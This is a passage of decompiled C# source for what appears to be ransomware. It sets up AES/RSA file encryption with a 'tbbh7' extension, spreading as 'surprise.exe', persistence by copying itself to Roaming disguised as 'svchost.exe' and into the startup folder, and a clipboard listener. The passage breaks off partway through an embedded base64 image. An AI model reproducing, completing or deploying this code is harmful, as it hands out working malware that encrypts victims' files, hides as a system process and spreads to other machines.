using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "tbbh7";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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